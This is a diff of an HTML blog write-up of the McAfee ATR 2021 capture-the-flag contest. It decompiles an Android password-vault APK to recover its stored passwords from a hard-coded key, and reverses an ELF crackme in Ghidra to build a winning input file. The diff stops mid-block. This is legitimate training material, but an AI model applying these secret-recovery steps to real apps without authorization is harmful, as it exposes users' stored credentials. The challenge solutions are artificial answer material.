@@ -1,515 +1,641 @@
-<doctype html>
 <html>
 <head>
-	<meta charset="UTF-8">
-	<title>McAfee ATR CTF 2021 Writeup</title>
-	<link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
-	<link rel="stylesheet" type="text/css" href="styles/blog.css">
-	<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-	<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <title>McAfee ATR CTF 2021 Writeup</title>
+    <link rel="stylesheet" href="styles/modified_darcula.css">
+    <script src="js/highlight.pack.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <link rel="stylesheet" href="styles/screen_reader.css">
+    <link rel="stylesheet" href="styles/base.css">
+    <link rel="stylesheet" href="styles/blockquotes.css">
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 </head>
-
 <body>
+    <main>
+        <header class="article-header">
+            <h1>McAfee ATR CTF 2021 Writeup</h1>
+            <span class="byline"> by Stefan (eu90h)</span>
+        </header>
+        <article class="content">
+            <div class="flexor">
+                <div style="width:85%" class="article-text">
+		    	
+<h2>Introduction</h2>
 
-<div id="wrapper">
-	<div class="header">
-		<h1>McAfee ATR CTF 2021 Writeup</h1>
-	</div>
-	
-	<div class="article-body">
-		<h3>Introduction</h3>
-		<p>
-		From February 5th to February 18th, 2021, McAfee's Advanced Threat Research team held a capture the flag (CTF) competition based on one held the year prior for its own employees. The challenges tested teams knowledge on topics ranging from recon, to cryptography, to rf hacking, and more. I had fun solving the challenges and learned a few things along the way. I decided to clean up the notes I had taken during the course of the competition and put them online in hopes they may be of later use.
-		</p>
-		<h3>Mobile Challenge: droid</h3>
-		<p>
-		For this challenge we are given an <a href="atrhax2021/PasswordVault.apk">APK file</a> called PasswordVault, a password manager for Android devices. The application is easily decompiled with <a href="https://github.com/skylot/jadx">jadx</a>. Of particular interest is the <a href="atrhax2021/passwordvault/AES.java">AES.java</a> file which has an AES class consisting of three methods: setKey, encrypt, and decrypt.</p>
-		<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
- 2
- 3
- 4
- 5
- 6
- 7
- 8
- 9
-10
-11
-12</pre></td><td><pre style="margin: 0; line-height: 125%">    <span style="color: #008800; font-weight: bold">public</span> <span style="color: #008800; font-weight: bold">static</span> String <span style="color: #0066BB; font-weight: bold">decrypt</span><span style="color: #333333">(</span>String str<span style="color: #333333">,</span> String str2<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-        <span style="color: #008800; font-weight: bold">try</span> <span style="color: #333333">{</span>
-            setKey<span style="color: #333333">(</span>str2<span style="color: #333333">);</span>
-            Cipher instance <span style="color: #333333">=</span> Cipher<span style="color: #333333">.</span><span style="color: #0000CC">getInstance</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;AES/ECB/PKCS5PADDING&quot;</span><span style="color: #333333">);</span>
-            instance<span style="color: #333333">.</span><span style="color: #0000CC">init</span><span style="color: #333333">(</span><span style="color: #0000DD; font-weight: bold">2</span><span style="color: #333333">,</span> secretKey<span style="color: #333333">);</span>
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #008800; font-weight: bold">new</span> <span style="color: #0066BB; font-weight: bold">String</span><span style="color: #333333">(</span>instance<span style="color: #333333">.</span><span style="color: #0000CC">doFinal</span><span style="color: #333333">(</span>Base64<span style="color: #333333">.</span><span style="color: #0000CC">getDecoder</span><span style="color: #333333">().</span><span style="color: #0000CC">decode</span><span style="color: #333333">(</span>str<span style="color: #333333">)));</span>
-        <span style="color: #333333">}</span> <span style="color: #008800; font-weight: bold">catch</span> <span style="color: #333333">(</span>Exception e<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-            PrintStream printStream <span style="color: #333333">=</span> System<span style="color: #333333">.</span><span style="color: #0000CC">out</span><span style="color: #333333">;</span>
-            printStream<span style="color: #333333">.</span><span style="color: #0000CC">println</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;Error while decrypting: &quot;</span> <span style="color: #333333">+</span> e<span style="color: #333333">.</span><span style="color: #0000CC">toString</span><span style="color: #333333">());</span>
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #008800; font-weight: bold">null</span><span style="color: #333333">;</span>
-        <span style="color: #333333">}</span>
-    <span style="color: #333333">}</span>
-</pre></td></tr></table></div>
-
-<p>From the decryption function, we see that the application is encrypting stored passwords using AES is ECB mode with PKCS5 padding. The <a href="atrhax2021/passwordvault/PwdContainer.java">PwdContainer.java</a> file appears to have a number of hard-coded passwords stored in an array. When the PwdContainer object is created, it retrieves a parameter called "SECRET" like so
-		<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1
-2
-3
-4
-5
-6
-7
-8</pre></td><td><pre style="margin: 0; line-height: 125%">        Intent intent <span style="color: #333333">=</span> getIntent<span style="color: #333333">();</span>
-        <span style="color: #008800; font-weight: bold">this</span><span style="color: #333333">.</span><span style="color: #0000CC">pwdDb</span> <span style="color: #333333">=</span> <span style="color: #333333">(</span>ListView<span style="color: #333333">)</span> findViewById<span style="color: #333333">(</span>R<span style="color: #333333">.</span><span style="color: #0000CC">id</span><span style="color: #333333">.</span><span style="color: #0000CC">listView</span><span style="color: #333333">);</span>
-        ArrayList arrayList <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">new</span> ArrayList<span style="color: #333333">(</span>Arrays<span style="color: #333333">.</span><span style="color: #0000CC">asList</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;p93hSxPQInWeGPVcmMxewg==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;jGl5hpGvF4MNtCTSNlcJzYkEWaQAdSMwQKERffswFuk=&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;ww/vxITH/93Ta/k5u5g1Pw==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;ISZotmRXFSOEmIVzUvv9bw==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;3KrWtdspWYCpVRJkmhbPZA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;TC4ONjo91AAGhH0+aRYmEA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;zj5LT5BVsgVjqHC1wZWPQhhXCk5jUilwx+4svDBSRD0=&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;aM+aAy8qPDU6PPSe5Hqq3w==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;Gi56D0Jrn54PaZnlmFeaZA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;BAW5c6F9UZiwdDlwm0udJQ==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;OYEX2V+vXODhONUXrlP+2Q==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;gJiMQqGKTFBQ6wPIVQoHTA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;wFjm0l2DbL3z+i7Bgpf5l3gBbiHLVJx0++r0j7kB9mc=&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;aYzMVpVlQpIAhKSud0AetA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;a79PD2rXccFkWKLCusG4Lg==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;j8mKBy9MuNTGksZypCrGKg==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;vwu2UHf3gVdtG4lSQd5X5A==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;8BMV5V164qNZJWSqyBZ2MA==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;st3r4csKDHT/alCwUXTgAw==&quot;</span><span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;2DP0pPvEzadEAuaF08h479K+8csb48hlRghXOi3mw/Y=&quot;</span><span style="color: #333333">));</span>
-        String stringExtra <span style="color: #333333">=</span> intent<span style="color: #333333">.</span><span style="color: #0000CC">getStringExtra</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;SECRET&quot;</span><span style="color: #333333">);</span>
-        <span style="color: #008800; font-weight: bold">for</span> <span style="color: #333333">(</span><span style="color: #333399; font-weight: bold">int</span> i <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span><span style="color: #333333">;</span> i <span style="color: #333333">&lt;</span> arrayList<span style="color: #333333">.</span><span style="color: #0000CC">size</span><span style="color: #333333">();</span> i<span style="color: #333333">++)</span> <span style="color: #333333">{</span>
-            <span style="color: #008800; font-weight: bold">new</span> <span style="color: #0066BB; font-weight: bold">String</span><span style="color: #333333">();</span>
-            <span style="color: #008800; font-weight: bold">this</span><span style="color: #333333">.</span><span style="color: #0000CC">list</span><span style="color: #333333">.</span><span style="color: #0000CC">add</span><span style="color: #333333">(</span>AES<span style="color: #333333">.</span><span style="color: #0000CC">decrypt</span><span style="color: #333333">(</span>arrayList<span style="color: #333333">.</span><span style="color: #0000CC">get</span><span style="color: #333333">(</span>i<span style="color: #333333">).</span><span style="color: #0000CC">toString</span><span style="color: #333333">(),</span> stringExtra<span style="color: #333333">));</span>
-        <span style="color: #333333">}</span>
-</pre></td></tr></table></div>
-
-		This 'secret' value is then given as the key parameter to the AES.decrypt function.
-		</p>
-		<p>
-Taking a look at <a href="atrhax2021/passwordvault/MainActivity.java">MainActivity</a>, we see that the application presents the user with a password entry prompt. This user-supplied password is checked against a hard-coded string "notthefl@g". If they are equal, the value "notthefl@g" is stored in the "SECRET" value.
-		<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
- 2
- 3
- 4
- 5
- 6
- 7
- 8
- 9
-10
-11</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-weight: bold">public</span> <span style="color: #333399; font-weight: bold">void</span> <span style="color: #0066BB; font-weight: bold">onClick</span><span style="color: #333333">(</span>View view<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-    String obj <span style="color: #333333">=</span> MainActivity<span style="color: #333333">.</span><span style="color: #0000CC">this</span><span style="color: #333333">.</span><span style="color: #0000CC">password</span><span style="color: #333333">.</span><span style="color: #0000CC">getText</span><span style="color: #333333">().</span><span style="color: #0000CC">toString</span><span style="color: #333333">();</span>
-    <span style="color: #008800; font-weight: bold">if</span> <span style="color: #333333">(</span>obj<span style="color: #333333">.</span><span style="color: #0000CC">equals</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;notthefl@g&quot;</span><span style="color: #333333">))</span> <span style="color: #333333">{</span>
-        Intent intent <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">new</span> Intent<span style="color: #333333">(</span>view<span style="color: #333333">.</span><span style="color: #0000CC">getContext</span><span style="color: #333333">(),</span> PwdContainer<span style="color: #333333">.</span><span style="color: #0000CC">class</span><span style="color: #333333">);</span>
-        intent<span style="color: #333333">.</span><span style="color: #0000CC">putExtra</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;SECRET&quot;</span><span style="color: #333333">,</span> obj<span style="color: #333333">);</span>
-        MainActivity<span style="color: #333333">.</span><span style="color: #0000CC">this</span><span style="color: #333333">.</span><span style="color: #0000CC">invalid</span><span style="color: #333333">.</span><span style="color: #0000CC">setVisibility</span><span style="color: #333333">(</span><span style="color: #0000DD; font-weight: bold">4</span><span style="color: #333333">);</span>
-        MainActivity<span style="color: #333333">.</span><span style="color: #0000CC">this</span><span style="color: #333333">.</span><span style="color: #0000CC">startActivity</span><span style="color: #333333">(</span>intent<span style="color: #333333">);</span>
-        <span style="color: #008800; font-weight: bold">return</span><span style="color: #333333">;</span>
-    <span style="color: #333333">}</span>
-    MainActivity<span style="color: #333333">.</span><span style="color: #0000CC">this</span><span style="color: #333333">.</span><span style="color: #0000CC">invalid</span><span style="color: #333333">.</span><span style="color: #0000CC">setVisibility</span><span style="color: #333333">(</span><span style="color: #0000DD; font-weight: bold">0</span><span style="color: #333333">);</span>
-<span style="color: #333333">}</span>
-</pre></td></tr></table></div>
-
-		</p>
-		Thus the key given to AES.decrypt is equal to "notthefl@g". Returning to the AES class, we can see how the decryption key is derived from the given parameter.
-		<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
- 2
- 3
- 4
- 5
- 6
- 7
- 8
- 9
-10
-11
-12</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-weight: bold">public</span> <span style="color: #008800; font-weight: bold">static</span> <span style="color: #333399; font-weight: bold">void</span> <span style="color: #0066BB; font-weight: bold">setKey</span><span style="color: #333333">(</span>String str<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-    <span style="color: #008800; font-weight: bold">try</span> <span style="color: #333333">{</span>
-        key <span style="color: #333333">=</span> str<span style="color: #333333">.</span><span style="color: #0000CC">getBytes</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;UTF-8&quot;</span><span style="color: #333333">);</span>
-        key <span style="color: #333333">=</span> MessageDigest<span style="color: #333333">.</span><span style="color: #0000CC">getInstance</span><span style="color: #333333">(</span><span style="background-color: #fff0f0">&quot;SHA-1&quot;</span><span style="color: #333333">).</span><span style="color: #0000CC">digest</span><span style="color: #333333">(</span>key<span style="color: #333333">);</span>
-        key <span style="color: #333333">=</span> Arrays<span style="color: #333333">.</span><span style="color: #0000CC">copyOf</span><span style="color: #333333">(</span>key<span style="color: #333333">,</span> <span style="color: #0000DD; font-weight: bold">16</span><span style="color: #333333">);</span>
-        secretKey <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">new</span> SecretKeySpec<span style="color: #333333">(</span>key<span style="color: #333333">,</span> <span style="background-color: #fff0f0">&quot;AES&quot;</span><span style="color: #333333">);</span>
-    <span style="color: #333333">}</span> <span style="color: #008800; font-weight: bold">catch</span> <span style="color: #333333">(</span>NoSuchAlgorithmException e<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-        e<span style="color: #333333">.</span><span style="color: #0000CC">printStackTrace</span><span style="color: #333333">();</span>
-    <span style="color: #333333">}</span> <span style="color: #008800; font-weight: bold">catch</span> <span style="color: #333333">(</span>UnsupportedEncodingException e2<span style="color: #333333">)</span> <span style="color: #333333">{</span>
-        e2<span style="color: #333333">.</span><span style="color: #0000CC">printStackTrace</span><span style="color: #333333">();</span>
-    <span style="color: #333333">}</span>
-<span style="color: #333333">}</span>
-</pre></td></tr></table></div>
-
-The decrypt function calls AES.setKey with the first parameter ("notthefl@g"), which computes the SHA-1 digest of the string. Therefore we can decrypt all the stored passwords by decrypting them with AES-ECB-PKCS5 using the key given by SHA1("notthefl@g").
-		<h3>Reversing #1: Two's Company</h3>
-		<p>
-		We are given a 32-bit Linux ELF <a href="atrhax2021/crackme">executable</a> and asked to understand its workings well enough to create two files that, when given to the program, trigger a victory condition. I used Ghidra to analyze the file. It seems this program makes most of its function calls indirectly by looking up pointers in a table whose base address is held in ebx at call time.
-
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
-                         *******************************************************
-                         *                      FUNCTION                       *
-                         *******************************************************
-                         undefined jmp_ebx+0x14()
-           undefined       AL:1         <RETURN>
-                         jmp_ebx+0x14                              XREF[1]:   entry:00011140(c)  
-      000110d0 f3 0f 1e      ENDBR32                                              this is the first function c
-               fb
-      000110d4 ff a3 14      JMP       dword ptr [EBX + 0x14]
-               00 00 00
-
-	</pre></div>
-	We see above an example of one the indirect function calls, although a number of such functions exist in the executable, each with a different offset from ebx.<br>
-		</p>
-		<p>
-		The most interesting function is located at 0x0001124d. Early in the function, we can see an indirect call to fopen, opening "file1" in read mode.
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
-		      0001129b 8d 83 40      LEA       EAX,[EBX + 0xffffe040]=>DAT_00012008       = 72h    r
-               e0 ff ff
-      000112a1 50            PUSH      EAX=>DAT_00012008                          = 72h    r
-      000112a2 8d 83 42      LEA       EAX,[EBX + 0xffffe042]=>s_file1_0001200a   = "file1"
-               e0 ff ff
-      000112a8 50            PUSH      EAX=>s_file1_0001200a                      = "file1"
-      000112a9 e8 42 fe      CALL      jmp_ebx+0x1c                               undefined jmp_ebx+0x1c()
-               ff ff
-	</pre></div>
-	After error checking, a while loop is entered. We see below the while loop as (accurately) decompiled by Ghidra:
-	<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-weight: bold">while</span> (iVar3 <span style="color: #333333">=</span> jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x20</span>(iVar1), iVar3 <span style="color: #333333">!=</span> <span style="color: #333333">-</span><span style="color: #0000DD; font-weight: bold">1</span>) {
-        iVar4 <span style="color: #333333">=</span> jmp_ebx<span style="color: #333333">+</span><span style="color: #005588; font-weight: bold">0x18</span>(iVar1);
-        <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">1</span>) {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x46</span>) <span style="color: #008800; font-weight: bold">break</span>;
-          local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">3</span>) {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x4c</span>) {
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-          }
-          local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">5</span>) {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x41</span>) {
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-          }
-          local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">9</span>) {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x47</span>) {
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-          }
-          local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        <span style="color: #008800; font-weight: bold">if</span> (iVar4 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">10</span>) {
-          <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">!=</span> <span style="color: #005588; font-weight: bold">0x31</span>) {
-            <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
-          }
-          local_28 <span style="color: #333333">=</span> local_28 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        <span style="color: #008800; font-weight: bold">if</span> (iVar3 <span style="color: #333333">==</span> <span style="color: #0000DD; font-weight: bold">10</span>) {
-          local_30 <span style="color: #333333">=</span> local_30 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-        }
-        local_34 <span style="color: #333333">=</span> local_34 <span style="color: #333333">+</span> <span style="color: #0000DD; font-weight: bold">1</span>;
-}
-</pre></div>
-		</p>
 <p>
-Next, if local_34 equals 10 and local_30 equals 5 and local_28 is also 5, then another while loop is executed. Before looking at the second loop, let's understand what this first one is doing since it controls the three values local_34, local_30, and local_28.</p>
-<p>This first loop has a conditional that calls jmp_ebx+0x20(iVar), sets iVar3 to the return value, which is then checked for inequality with -1. If one if familiar with C-language file I/O in the UNIX world, then one may suspect this is likely reading or peeking at the file stream and checking if the result is EOF (end-of-file). In this particular case, jmp_ebx+0x20 corresponds to fgetc. 
-	<blockquote>
-		<p>fgetc() reads the next character from stream and returns it as an unsigned char cast to an int, or EOF on end of file or error.
+From February 5th to February 18th, 2021, McAfee's Advanced Threat Research team held a capture the flag (CTF) competition based on one held the year prior for its own employees. The challenges tested teams knowledge on topics ranging from recon, to cryptography, to rf hacking, and more. I had fun solving the challenges and learned a few things along the way. I decided to clean up the notes I had taken during the course of the competition and put them online in hopes they may be of later use.
 </p>
+
+<h3>Mobile Challenge: droid</h3>
+
+<p>
+For this challenge we are given an <a href="atrhax2021/PasswordVault.apk">APK file</a> called PasswordVault, a password manager for Android devices. The application is easily decompiled with <a href="https://github.com/skylot/jadx">jadx</a>. Of particular interest is the <a href="atrhax2021/passwordvault/AES.java">AES.java</a> file which has an AES class consisting of three methods: setKey, encrypt, and decrypt.
+</p>
+<pre id="java"><code>
+  public static String decrypt(String str, String str2) {
+    try {
+        setKey(str2);
+        Cipher instance = Cipher.getInstance("AES/ECB/PKCS5PADDING");
+        instance.init(2, secretKey);
+        return new String(instance.doFinal(Base64.getDecoder().decode(str)));
+    } catch (Exception e) {
+        PrintStream printStream = System.out;
+        printStream.println("Error while decrypting: " + e.toString());
+        return null;
+    }
+}
+</code></pre>
+<p>
+From the decryption function, we see that the application is encrypting stored passwords using AES is ECB mode with PKCS5 padding. The <a href="atrhax2021/passwordvault/PwdContainer.java">PwdContainer.java</a> file appears to have a number of hard-coded passwords stored in an array. When the PwdContainer object is created, it retrieves a parameter called "SECRET" like so
+</p>
+<pre id="java"><code>
+  Intent intent = getIntent();
+  this.pwdDb = (ListView) findViewById(R.id.listView);
+  ArrayList arrayList = new ArrayList(Arrays.asList("p93hSxPQInWeGPVcmMxewg==", "jGl5hpGvF4MNtCTSNlcJzYkEWaQAdSMwQKERffswFuk=", "ww/vxITH/93Ta/k5u5g1Pw==", "ISZotmRXFSOEmIVzUvv9bw==", "3KrWtdspWYCpVRJkmhbPZA==", "TC4ONjo91AAGhH0+aRYmEA==", "zj5LT5BVsgVjqHC1wZWPQhhXCk5jUilwx+4svDBSRD0=", "aM+aAy8qPDU6PPSe5Hqq3w==", "Gi56D0Jrn54PaZnlmFeaZA==", "BAW5c6F9UZiwdDlwm0udJQ==", "OYEX2V+vXODhONUXrlP+2Q==", "gJiMQqGKTFBQ6wPIVQoHTA==", "wFjm0l2DbL3z+i7Bgpf5l3gBbiHLVJx0++r0j7kB9mc=", "aYzMVpVlQpIAhKSud0AetA==", "a79PD2rXccFkWKLCusG4Lg==", "j8mKBy9MuNTGksZypCrGKg==", "vwu2UHf3gVdtG4lSQd5X5A==", "8BMV5V164qNZJWSqyBZ2MA==", "st3r4csKDHT/alCwUXTgAw==", "2DP0pPvEzadEAuaF08h479K+8csb48hlRghXOi3mw/Y="));
+  String stringExtra = intent.getStringExtra("SECRET");
+  for (int i = 0; i < arrayList.size(); i++) {
+      new String();
+      this.list.add(AES.decrypt(arrayList.get(i).toString(), stringExtra));
+  }
+</code></pre>
+<p>
+This 'secret' value is then given as the key parameter to the AES.decrypt function.
+</p>
+
+<p>
+Taking a look at <a href="atrhax2021/passwordvault/MainActivity.java">MainActivity</a>, we see that the application presents the user with a password entry prompt. This user-supplied password is checked against a hard-coded string "notthefl@g". If they are equal, the value "notthefl@g" is stored in the "SECRET" value.
+</p>
+<pre id="java"><code>
+  public void onClick(View view) {
+    String obj = MainActivity.this.password.getText().toString();
+    if (obj.equals("notthefl@g")) {
+        Intent intent = new Intent(view.getContext(), PwdContainer.class);
+        intent.putExtra("SECRET", obj);
+        MainActivity.this.invalid.setVisibility(4);
+        MainActivity.this.startActivity(intent);
+        return;
+    }
+    MainActivity.this.invalid.setVisibility(0);
+}
+</code></pre>
+<p>
+Thus the key given to AES.decrypt is equal to "notthefl@g". Returning to the AES class, we can see how the decryption key is derived from the given parameter.
+</p>
+<pre id="java"><code>
+  public static void setKey(String str) {
+    try {
+        key = str.getBytes("UTF-8");
+        key = MessageDigest.getInstance("SHA-1").digest(key);
+        key = Arrays.copyOf(key, 16);
+        secretKey = new SecretKeySpec(key, "AES");
+    } catch (NoSuchAlgorithmException e) {
+        e.printStackTrace();
+    } catch (UnsupportedEncodingException e2) {
+        e2.printStackTrace();
+    }
+}
+</code></pre>
+<p>
+The decrypt function calls AES.setKey with the first parameter ("notthefl@g"), which computes the SHA-1 digest of the string. Therefore we can decrypt all the stored passwords by decrypting them with AES-ECB-PKCS5 using the key given by SHA1("notthefl@g").
+</p>
+
+<h3>Reversing #1 Two's Company</h3>
+
+<p>
+We are given a 32-bit Linux ELF <a href="atrhax2021/crackme">executable</a> and asked to understand its workings well enough to create two files that, when given to the program, trigger a victory condition. I used Ghidra to analyze the file. It seems this program makes most of its function calls indirectly by looking up pointers in a table whose base address is held in ebx at call time.
+</p>
+
+<pre id="nasm"><code>
+undefined jmp_ebx+0x14()
+undefined       AL:1         <RETURN>
+jmp_ebx+0x14                              XREF[1]:   entry:00011140(c)  
+000110d0 f3 0f 1e      ENDBR32                                              this is the first function c
+         fb
+000110d4 ff a3 14      JMP       dword ptr [EBX + 0x14]
+         00 00 00
+
+</code></pre>
+
+<p>
+We see above an example of one the indirect function calls, although a number of such functions exist in the executable, each with a different offset from ebx.
+</p>
+
+<p>
+		The most interesting function is located at 0x0001124d. Early in the function, we can see an indirect call to fopen, opening "file1" in read mode.
+</p>
+
+<pre id="nasm"><code>
+0001129b 8d 83 40      LEA       EAX,[EBX + 0xffffe040]=>DAT_00012008       = 72h    r
+         e0 ff ff
+000112a1 50            PUSH      EAX=>DAT_00012008                          = 72h    r
+000112a2 8d 83 42      LEA       EAX,[EBX + 0xffffe042]=>s_file1_0001200a   = "file1"
+         e0 ff ff
+000112a8 50            PUSH      EAX=>s_file1_0001200a                      = "file1"
+000112a9 e8 42 fe      CALL      jmp_ebx+0x1c                               undefined jmp_ebx+0x1c()
+         ff ff
+
+</code></pre>
+
+<p>
+	After error checking, a while loop is entered. We see below the while loop as (accurately) decompiled by Ghidra:
+</p>
+
+<p>
+		
+</p>
+
+<p>
+Next, if local_34 equals 10 and local_30 equals 5 and local_28 is also 5, then another while loop is executed. Before looking at the second loop, let's understand what this first one is doing since it controls the three values local_34, local_30, and local_28.
+</p>
+
+<p>
+This first loop has a conditional that calls jmp_ebx+0x20(iVar), sets iVar3 to the return value, which is then checked for inequality with -1. If one if familiar with C-language file I/O in the UNIX world, then one may suspect this is likely reading or peeking at the file stream and checking if the result is EOF (end-of-file). In this particular case, jmp_ebx+0x20 corresponds to fgetc. 
+</p>
+
+<p>
+	<blockquote>
+</p>
+
+<p>
+		fgetc() reads the next character from stream and returns it as an unsigned char cast to an int, or EOF on end of file or error.
+</p>
+
+<p>
 			      <footer>man 3 fgetc</footer>
+</p>
+
+<p>
 	</blockquote>
 </p>
+
 <p>
 Next, we see that another local variable, iVar4, is set to the value of jmp_ebx+0x18(iVar1), which is the ftell function. 
+</p>
+
+<p>
 	<blockquote>
-		<p>The ftell() function obtains the current value of the file position indicator for the stream pointed to by stream.<br>
+</p>
+
+<p>
+		The ftell() function obtains the current value of the file position indicator for the stream pointed to by stream.
+</p>
+
+<p>
        The rewind() function returns no value.  Upon successful completion, fgetpos(), fseek(), fsetpos() return 0, and ftell() returns the current offset.  Otherwise, -1 is returned and errno is set to indicate the error.
 </p>
+
+<p>
 			      <footer>man 3 ftell</footer>
+</p>
+
+<p>
 	</blockquote>
+</p>
+
+<p>
 	This is sufficient to understand what is happening in the first while loop (shown above). The local variable iVar4 refers to the current position within the file stream, while iVar3 refers to the byte found at that position.
-		</p>
-	<p>
+</p>
+
+<p>
+		
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	The output below shows the proper input to control the first while loop.
-	<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
+</p>
+
+<pre id="bash"><code>
 ~/atrhax/twos-company % xxd file1
 00000000: 460a 4c0a 410a 0a0a 4731                 F.L.A...G1
-</div>
-	</p>
+
+</code></pre>
+
+<p>
+	
+</p>
+
+<p>
 	Now consider the second while loop.
-	<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%"> 1
- 2
- 3
- 4
- 5
- 6
- 7
- 8
- 9
-10
